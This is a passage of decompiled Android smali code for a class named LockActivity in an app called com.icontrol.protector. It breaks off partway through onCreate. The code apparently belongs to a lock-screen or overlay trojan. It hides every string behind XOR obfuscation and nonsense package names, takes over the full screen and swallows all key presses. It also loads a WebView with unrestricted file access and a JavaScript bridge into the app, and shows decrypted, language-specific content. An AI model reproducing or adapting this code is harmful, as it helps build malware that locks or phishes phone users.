.class public Lcom/icontrol/protector/LockActivity;
.super Landroid/app/Activity;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/LockActivity$c;,
        Lcom/icontrol/protector/LockActivity$b;,
        Lcom/icontrol/protector/LockActivity$d;
    }
.end annotation


# static fields
.field private static c:Lcom/icontrol/protector/LockActivity;

.field static d:Landroid/content/Context;


# instance fields
.field b:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0x5c

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/LockActivity;->b:Ljava/lang/String;

    return-void

    :array_0
    .array-data 1
        0xct
        -0x49t
        -0x40t
        0x18t
        -0x58t
        -0x16t
        -0x17t
        0x79t
        0x22t
        -0x7at
        -0x13t
        0x16t
        -0x45t
        -0x24t
        -0x68t
        0x7ct
        0x36t
        -0x4ct
        -0x16t
        0x12t
        -0x51t
        -0x6t
        -0x68t
        0x73t
        0x24t
        -0x60t
        -0x39t
        0x16t
        -0x45t
        -0x24t
        -0x68t
        0x70t
        0x26t
        -0x60t
        -0x2dt
        0x16t
        -0x45t
        -0x24t
        -0x66t
        0x3t
        0x2dt
        -0x60t
        -0xbt
        0x14t
        -0x45t
        -0x24t
        -0x68t
        0x73t
        0x26t
        -0x2ft
        -0x12t
        0x12t
        -0x55t
        -0x35t
        -0x75t
        0x6t
        0x57t
        -0x74t
        -0x34t
        0x3ct
        -0x2ft
        -0x24t
        -0x1ft
        0x73t
        0x24t
        -0x50t
        -0x29t
        0x15t
        -0x45t
        -0x32t
        -0x46t
        0x6bt
        0x51t
        -0x2dt
        -0x25t
        0x16t
        -0x45t
        -0x24t
        -0x68t
        0x73t
        0x36t
        -0x4ct
        -0x2ct
        0x18t
        -0x58t
        -0x2at
        -0x14t
        0x71t
        0x3ct
        -0x58t
        -0x35t
        0x6at
    .end array-data

    :array_1
    .array-data 1
        0x65t
        -0x1ft
        -0x7et
        0x57t
        -0x6t
        -0x63t
        -0x27t
        0x32t
    .end array-data
.end method

.method public static synthetic a()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/LockActivity;->d()V

    return-void
.end method

.method public static b()V
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/app/Activity;->finish()V

    :cond_0
    return-void
.end method

.method public static c()Z
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private static synthetic d()V
    .locals 5

    .line 1
    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->M:Ljava/lang/String;

    const-string v2, ""

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->N:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->O:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->P:Ljava/lang/String;

    const/4 v2, 0x1

    new-array v2, v2, [B

    const/4 v3, 0x0

    const/4 v4, -0x2

    aput-byte v4, v2, v3

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    const/16 v1, 0xa

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    new-array v2, v3, [B

    fill-array-data v2, :array_2

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_3

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x32t
        0x60t
        -0x79t
        0x60t
        -0x50t
        0x48t
        -0xdt
        -0x21t
    .end array-data

    :array_1
    .array-data 1
        -0x2ct
        0x15t
        0x2ct
        0x0t
        0x7bt
        0x38t
        -0x3t
        -0x12t
        -0x35t
        0x1at
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x5ct
        0x74t
        0x5ft
        0x73t
        0xct
        0x57t
        -0x71t
        -0x76t
    .end array-data

    :array_3
    .array-data 1
        -0x76t
        -0x9t
        0x54t
        -0x26t
        0x15t
        -0x56t
        0x24t
        0x7ft
    .end array-data

    :array_4
    .array-data 1
        -0x19t
        -0x68t
        0x30t
        -0x41t
        0x71t
        -0x3dt
        0x45t
        0x10t
    .end array-data
.end method

.method private e(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    .line 1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object p1

    sget-object v0, Lcom/icontrol/protector/My_Configs;->AsstsKey:Ljava/lang/String;

    const/16 v1, 0x9

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Ljava/io/BufferedReader;

    new-instance v1, Ljava/io/InputStreamReader;

    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-direct {v1, p1, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "\n"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    :catch_0
    move-exception p1

    goto :goto_2

    :cond_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_1

    :cond_1
    invoke-virtual {p1}, Ljava/io/InputStream;->available()I

    move-result v0

    new-array v0, v0, [B

    invoke-virtual {p1, v0}, Ljava/io/InputStream;->read([B)I

    invoke-virtual {p1}, Ljava/io/InputStream;->close()V

    sget-object p1, Lcom/icontrol/protector/My_Configs;->AsstsKey:Ljava/lang/String;

    invoke-static {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->z([BLjava/lang/String;)[B

    move-result-object p1

    new-instance v0, Ljava/lang/String;

    sget-object v1, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-direct {v0, p1, v1}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-object p1, v0

    :goto_1
    return-object p1

    :goto_2
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 p1, 0x0

    return-object p1

    :array_0
    .array-data 1
        0x46t
        0x16t
        -0x52t
        -0x4ft
        0x4ct
        0x40t
        0x42t
        0x18t
        0x40t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x1dt
        0x57t
        -0x3t
        -0x1bt
        0x61t
        0x10t
        0x3t
        0x4bt
    .end array-data
.end method


# virtual methods
.method public dispatchKeyEvent(Landroid/view/KeyEvent;)Z
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public onBackPressed()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 16

    move-object/from16 v0, p0

    const-string v1, ""

    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sput-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v3

    const/16 v4, 0x400

    invoke-virtual {v3, v4, v4}, Landroid/view/Window;->setFlags(II)V

    const/4 v3, 0x2

    :try_start_0
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x1e

    if-lt v4, v5, :cond_0

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v4

    invoke-static {v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ik0;->a(Landroid/view/Window;)Landroid/view/WindowInsetsController;

    move-result-object v4

    if-eqz v4, :cond_1

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/yj0;->a()I

    move-result v5

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zj0;->a()I

    move-result v6

    or-int/2addr v5, v6

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/vr;->a(Landroid/view/WindowInsetsController;I)V

    invoke-static {v4, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/wr;->a(Landroid/view/WindowInsetsController;I)V

    goto :goto_0

    :cond_0
    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v4

    invoke-virtual {v4}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v4

    const/16 v5, 0x1002

    invoke-virtual {v4, v5}, Landroid/view/View;->setSystemUiVisibility(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    :goto_0
    sget-object v4, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    if-nez v4, :cond_2

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    sput-object v4, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    :cond_2
    new-instance v4, Landroid/webkit/WebView;

    invoke-direct {v4, v0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v5

    invoke-virtual {v5, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v5

    invoke-virtual {v5, v2}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v5

    invoke-virtual {v5, v2}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    :try_start_1
    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v5

    invoke-virtual {v5, v2}, Landroid/webkit/CookieManager;->setAcceptCookie(Z)V

    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v5

    invoke-virtual {v5, v4, v2}, Landroid/webkit/CookieManager;->setAcceptThirdPartyCookies(Landroid/webkit/WebView;Z)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v5

    invoke-virtual {v5, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    const/4 v5, 0x0

    invoke-virtual {v4, v5}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v2}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v2}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v2}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v2}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v2}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    const/4 v6, -0x1

    const/4 v7, 0x0

    :try_start_2
    invoke-virtual {v4, v3, v7}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v8

    sget-object v9, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {v8, v9}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v8

    sget-object v9, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v8, v9}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    invoke-virtual {v4, v6}, Landroid/webkit/WebView;->setBackgroundColor(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    invoke-virtual {v4, v5}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    new-instance v8, Lcom/icontrol/protector/LockActivity$c;

    invoke-direct {v8, v0, v7}, Lcom/icontrol/protector/LockActivity$c;-><init>(Lcom/icontrol/protector/LockActivity;Lcom/icontrol/protector/LockActivity$a;)V

    invoke-virtual {v4, v8}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    new-instance v8, Lcom/icontrol/protector/LockActivity$b;

    invoke-direct {v8, v0, v7}, Lcom/icontrol/protector/LockActivity$b;-><init>(Lcom/icontrol/protector/LockActivity;Lcom/icontrol/protector/LockActivity$a;)V

    invoke-virtual {v4, v8}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    new-instance v7, Lcom/icontrol/protector/LockActivity$d;

    invoke-direct {v7, v0, v0}, Lcom/icontrol/protector/LockActivity$d;-><init>(Lcom/icontrol/protector/LockActivity;Landroid/content/Context;)V

    const/16 v8, 0xa

    new-array v8, v8, [B

    fill-array-data v8, :array_0

    const/16 v9, 0x8

    new-array v10, v9, [B

    fill-array-data v10, :array_1

    invoke-static {v8, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v7, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    const/16 v8, 0x154

    const/16 v10, 0x28a

    invoke-static {v7, v8, v10, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->m(Landroid/content/Context;IIZ)Ljava/lang/String;

    move-result-object v7

    :try_start_3
    new-array v8, v3, [B

    fill-array-data v8, :array_2

    new-array v10, v9, [B

    fill-array-data v10, :array_3

    invoke-static {v8, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_3

    iget-object v7, v0, Lcom/icontrol/protector/LockActivity;->b:Ljava/lang/String;

    :cond_3
    sget-object v8, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v10, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->N:Ljava/lang/String;

    const/16 v11, 0x15

    new-array v11, v11, [B

    fill-array-data v11, :array_4

    new-array v12, v9, [B

    fill-array-data v12, :array_5

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-static {v8, v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v10, 0x5

    new-array v11, v10, [B

    fill-array-data v11, :array_6

    new-array v12, v9, [B

    fill-array-data v12, :array_7

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    sget-object v12, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v13, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->P:Ljava/lang/String;

    invoke-static {v12, v13, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    sget-object v13, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v14, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->P:Ljava/lang/String;

    invoke-static {v13, v14, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v14

    invoke-virtual {v14}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->hashCode()I

    move-result v15

    const/16 v6, 0xca9

    if-eq v15, v6, :cond_6

    const/16 v6, 0xccc

    if-eq v15, v6, :cond_5

    const/16 v6, 0xf2e

    if-eq v15, v6, :cond_4

    goto :goto_1

    :cond_4
    new-array v6, v3, [B

    fill-array-data v6, :array_8

    new-array v15, v9, [B

    fill-array-data v15, :array_9

    invoke-static {v6, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v14, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_7

    move v6, v2

    goto :goto_2

    :cond_5
    new-array v6, v3, [B

    fill-array-data v6, :array_a

    new-array v15, v9, [B

    fill-array-data v15, :array_b

    invoke-static {v6, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v14, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_7

    move v6, v3

    goto :goto_2

    :cond_6
    new-array v6, v3, [B

    fill-array-data v6, :array_c

    new-array v15, v9, [B

    fill-array-data v15, :array_d

    invoke-static {v6, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v14, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_7

    move v6, v5

    goto :goto_2

    :cond_7
    :goto_1
    const/4 v6, -0x1

    :goto_2
    const/16 v14, 0xf

    if-eqz v6, :cond_a

    if-eq v6, v2, :cond_9

    if-eq v6, v3, :cond_8

    new-array v6, v14, [B

    fill-array-data v6, :array_e

    new-array v14, v9, [B

    fill-array-data v14, :array_f

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    goto :goto_3

    :cond_8
    const/16 v6, 0x17

    new-array v6, v6, [B

    fill-array-data v6, :array_10

    new-array v14, v9, [B

    fill-array-data v14, :array_11

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    goto :goto_3

    :cond_9
    const/16 v6, 0xd

    new-array v6, v6, [B

    fill-array-data v6, :array_12

    new-array v14, v9, [B

    fill-array-data v14, :array_13

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    goto :goto_3

    :cond_a
    new-array v6, v14, [B

    fill-array-data v6, :array_14

    new-array v14, v9, [B

    fill-array-data v14, :array_15

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    :goto_3
    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_b

    invoke-static {}, Lcom/icontrol/protector/LockActivity;->c()Z

    move-result v13

    if-eqz v13, :cond_b

    invoke-static {}, Lcom/icontrol/protector/LockActivity;->b()V

    :cond_b
    invoke-virtual {v12}, Ljava/lang/String;->hashCode()I

    move-result v13

    const/4 v14, 0x3

    packed-switch v13, :pswitch_data_0

    goto :goto_4

    :pswitch_0
    new-array v13, v2, [B

    const/16 v15, 0x30

    aput-byte v15, v13, v5

    new-array v5, v9, [B

    fill-array-data v5, :array_16

